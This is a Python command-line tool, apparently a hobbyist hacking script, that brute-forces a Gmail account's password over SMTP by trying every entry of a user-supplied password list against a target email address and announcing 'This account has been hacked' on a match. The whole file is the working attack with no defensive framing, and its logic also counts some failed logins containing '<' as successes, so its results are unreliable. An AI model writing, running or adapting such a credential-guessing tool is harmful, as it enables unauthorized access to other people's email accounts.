#!/usr/bin/python3
'''create by zuikarnaen'''

import smtplib
from os import system

def main():
    print('=================================================')
    print('               create by zulkarnaen                 ')
    print('=================================================')
   

main()

print('[1] Start the attack')
print('[2] Exit')
try:
    option = int(input('==> '))
    if option == 1:
        file_path = input('Path of passwords file: ')
    else:
        system('clear')
        exit()
except ValueError:
    print('[!] Invalid input. Exiting.')
    exit()

try:
    pass_file = open(file_path, 'r')
    pass_list = pass_file.readlines()
    pass_file.close()
except FileNotFoundError:
    print('[!] Passwords file not found. Exiting.')
    exit()

def login():
    i = 0
    user_name = input('Target email: ')
    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
    except Exception as e:
        print(f'[!] Failed to connect to SMTP server: {e}')
        exit()

    for password in pass_list:
        password = password.strip()  # Remove newline characters
        i += 1
        print(f'{i}/{len(pass_list)} Trying: {password}')
        try:
            server.login(user_name, password)
            system('clear')
            main()
            print('\n')
            print(f'[+] This account has been hacked. Password: {password}')
            break
        except smtplib.SMTPAuthenticationError as e:
            error = str(e)
            if '<' in error:
                system('clear')
                main()
                print(f'[+] This account has been hacked. Password: {password}')
                break
            else:
                print(f'[!] Password not found => {password}')
        except Exception as e:
            print(f'[!] An error occurred: {e}')
            break

login()
